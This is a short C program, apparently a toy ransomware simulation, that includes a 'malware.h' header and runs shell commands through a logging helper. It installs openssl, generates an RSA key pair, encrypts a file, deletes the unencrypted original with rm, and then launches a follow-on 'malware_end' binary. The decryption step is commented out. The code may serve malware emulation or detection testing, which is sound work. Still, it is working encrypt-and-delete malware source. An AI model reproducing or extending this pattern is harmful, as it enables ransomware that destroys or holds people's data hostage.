#include "malware.h"

// Generate encryption key
// Crypt some files and remove unencrypted file

int main(int argc, char **argv) {

	init(argv[0]);
	
	log_exec("Install some openssl package",
	"apt-get install openssl -y");

	log_exec("Create Key",
	"openssl genrsa -out secret.pem");

	log_exec("Extract public key",
	"openssl rsa -in secret.pem -pubout -out public.pem");

	log_exec("Encrypt file and delete original file",
	"openssl rsautl -encrypt -pubin -inkey public.pem -in file.txt -out file.txt.crypted");
	
	log_exec("Delete original file",
	"rm file.txt");

	//log_exec("Decrypt", "openssl rsautl -decrypt -inkey secret.pem -in file.txt.crypted -out file.txt");

	log_exec("Launch malware_end",
	"./malware_end");

	return EXIT_SUCCESS;
}
